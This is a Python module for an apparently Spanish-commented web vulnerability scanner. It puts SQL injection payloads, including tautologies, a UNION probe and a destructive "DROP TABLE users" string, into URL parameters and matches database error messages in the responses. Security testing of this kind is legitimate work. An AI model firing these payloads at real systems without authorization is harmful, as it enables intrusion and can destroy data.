#!/usr/bin/env python3
"""
SQL Injection Scanner Module
Basic SQL injection detection
"""

import asyncio
import aiohttp
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console

console = Console()

class SQLInjectionScanner:
    def __init__(self, session, config):
        self.session = session
        self.config = config
        
        # Payloads básicos para detección
        self.sql_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1\" AND \"1\"=\"1"
        ]
        
        # Errores SQL comunes
        self.sql_errors = [
            "sql syntax",
            "mysql_fetch",
            "ora-01756",
            "microsoft ole db",
            "odbc drivers error",
            "sqlite_exception",
            "postgresql",
            "warning: mysql",
            "valid mysql result",
            "mariadb server"
        ]
    
    async def scan(self, target_url):
        """Escanear SQL injection"""
        console.print(f"💉 Scanning SQL injection for {target_url}")
        
        vulnerabilities = []
        
        # Analizar URL para parámetros
        parsed_url = urlparse(target_url)
        
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            
            for param_name in params.keys():
                param_vulns = await self.test_parameter(target_url, param_name)
                vulnerabilities.extend(param_vulns)
        
        return vulnerabilities
    
    async def test_parameter(self, base_url, param_name):
        """Testear parámetro específico"""
        vulnerabilities = []
        
        for payload in self.sql_payloads:
            try:
                # Construir URL con payload
                parsed_url = urlparse(base_url)
                params = parse_qs(parsed_url.query)
                
                # Reemplazar parámetro con payload
                params[param_name] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    
                    # Buscar errores SQL en la respuesta
                    for error in self.sql_errors:
                        if error.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'SQL Injection',
                                'severity': 'HIGH',
                                'url': test_url,
                                'evidence': f"SQL error found with payload: {payload}",
                                'category': 'Injection',
                                'parameter': param_name,
                                'payload': payload
                            })
                            break
                
                # Delay entre requests
                await asyncio.sleep(self.config['scanner']['delay'])
                
            except Exception as e:
                console.print(f"❌ Error testing SQL injection: {e}")
        
        return vulnerabilities
